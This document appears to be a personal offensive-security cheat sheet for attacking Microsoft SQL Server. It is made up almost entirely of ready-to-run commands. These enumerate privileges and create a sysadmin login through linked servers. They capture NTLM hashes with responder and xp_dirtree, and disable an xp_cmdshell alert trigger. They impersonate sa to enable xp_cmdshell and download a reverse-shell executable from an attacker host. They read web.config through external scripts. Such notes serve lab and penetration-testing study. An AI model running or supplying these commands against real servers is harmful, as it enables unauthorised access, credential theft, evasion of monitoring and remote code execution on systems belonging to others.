---
title: "MSSQL Interaction"
date: 2024-6-27
tags: ["mssql", "database", "Windows", "exploit", "rce", "privilege escalation"]
---

---
### General

#### Connect to MSSQL DB

```bash
impacket-mssqlclient username:password@10.10.11.10
```

#### Basic Commands

```mysql
# Check mssql version
SELECT @@version;

# Check users
SELECT name FROM master..syslogins
SELECT name FROM master..syslogins WHERE sysadmin = '1';

# Check privilege
SELECT entity_name, permission_name FROM fn_my_permissions(NULL, 'SERVER');

# Show databases
SELECT name FROM master..sysdatabases;

# Show current database
SELECT DB_NAME();

# List tables and schema
select table_name,table_schema from db_name.INFORMATION_SCHEMA.TABLES;

# Select all from table
select * from db_name.table_schema.table_name;
```

###  Linked Servers

#### Basic Commands

<small>*Hint: Use double `''` to escape `'` in mssql*</small>

```mysql
# Show current server
select @@servername

# Show linked servers
select srvname from sysservers;
```

#### Execute Query between Linked Servers

```mysql
# Execute query from current server to linked server
EXECUTE ('select @@version;') at [DOMAIN\LINKED_SERVER];

# Execute query from linked server to current server
EXECUTE ('EXECUTE (''SELECT entity_name, permission_name FROM fn_my_permissions(NULL, ''''SERVER'''');'') at [DOMAIN\CURRENT_SERVER]') at [DOMAIN\LINKED_SERVER];
```

#### Create Admin User from Privilege Linked Server

```mysql
EXECUTE('EXECUTE(''CREATE LOGIN test WITH PASSWORD = ''''Test1234!@'''';'') AT [DOMAIN\CURRENT_SERVER]') AT [DOMAIN\LINKED_SERVER]
EXECUTE('EXECUTE(''EXEC sp_addsrvrolemember ''''test'''', ''''sysadmin'''''') AT [DOMAIN\CURRENT_SERVER]') AT [DOMAIN\LINKED_SERVER]
```

### Exploitation

#### Steal NTLM hash

```bash
# In our local Linux machine
sudo responder -I tun0
```

```mysql
# Inside mssql terminal
xp_dirtree '\\10.10.14.10\any\thing';
```

#### xp_cmdshell

```mysql
# Check any policy blocking xp_cmdshell
select name from sys.server_triggers;

# Disable trigger if any
disable trigger ALERT_xp_cmdshell on all server;

# Enable xp_cmdshell
enable_xp_cmdshell;

# RCE
xp_cmdshell whoami
```

#### Impersonate sa to run xp_cmdshell

```mysql
execute as login = 'sa'; exec sp_configure 'show advanced options', 1;
execute as login = 'sa'; reconfigure;
execute as login = 'sa'; exec sp_configure 'xp_cmdshell', 1;
execute as login = 'sa'; reconfigure;
execute as login = 'sa'; EXEC master..xp_cmdshell 'powershell.exe -ep bypass curl 10.10.14.10/rev.exe -o c:\windows\tasks\rev.exe'
```

#### Run External Script

```mysql
EXEC sp_execute_external_script @language =N'Python', @script = N'import os; os.system("whoami");';
EXEC sp_execute_external_script @language =N'Python', @script = N'import os; os.system("type \inetpub\wwwroot\web.config");';
```

<br>